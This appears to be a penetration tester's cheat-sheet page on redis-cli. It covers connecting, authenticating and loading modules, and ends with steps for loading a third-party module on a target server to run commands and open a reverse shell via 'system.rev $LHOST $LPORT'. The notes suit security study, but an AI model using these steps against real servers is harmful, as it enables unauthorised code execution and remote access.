> A terminal program used to send commands to and read replies from a [[redis|Redis]] server.

---

## Connect to a Redis Server & Drop Into REPL

```bash
redis-cli [-h $FQDN_OR_IP] [-p $PORT] [-a $PASSWORD]
```

- Without `-h`, `$FQDN_OR_IP` defaults to `127.0.0.1`
- Without `-p`, `$PORT` defaults to `6379`
- If necessary, `$PASSWORD` can be provided by the `$REDISCLI_AUTH` environment variable

---

## Connect to a Redis Server & Execute Commands Non-Interactively

### Single Command

```bash
redis-cli [-h $FQDN_OR_IP] [-p $PORT] [-a $PASSWORD] $COMMAND
```

- Without `-h`, `$FQDN_OR_IP` defaults to `127.0.0.1`
- Without `-p`, `$PORT` defaults to `6379`
- If necessary, `$PASSWORD` can be provided by the `$REDISCLI_AUTH` environment variable

### Multiple Commands from File

```bash
redis-cli [-h $FQDN_OR_IP] [-p $PORT] [-a $PASSWORD] < $PATH_TO_COMMAND_FILE
```

- Without `-h`, `$FQDN_OR_IP` defaults to `127.0.0.1`
- Without `-p`, `$PORT` defaults to `6379`
- If necessary, `$PASSWORD` can be provided by the `$REDISCLI_AUTH` environment variable

---

## (REPL) Authenticate

```txt
AUTH [$USERNAME] $PASSWORD
```

A successful authentication will result in the response `OK`.

---

## Redis Modules

Modules can be used to extend Redis's functionality. Read more about them [here](https://redis.io/docs/reference/modules/).

### (REPL) Load Module

```txt
MODULE LOAD $PATH_TO_MODULE
```

### (REPL) List Modules

```txt
MODULE LIST
```

### Command Execution & Reverse Shell Module

Clone the `n0b0dyCN`'s repository from [here](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand).

Change into the directory and compile the module with `make`.

[[file-transfer/file-transfer|Transfer the module]] (`module.so`) to the target and [[redis-cli#(REPL) Load Module|load it]] into the current REPL. [[redis-cli#(REPL) List Modules|Ensure the module was loaded successfully]].

Execute a command:

```txt
system.exec "$COMMAND"
```

Initiate a reverse shell:

```txt
system.rev $LHOST $LPORT
```

---

## References

[Redis CLI - Redis Docs](https://redis.io/docs/manual/cli/)
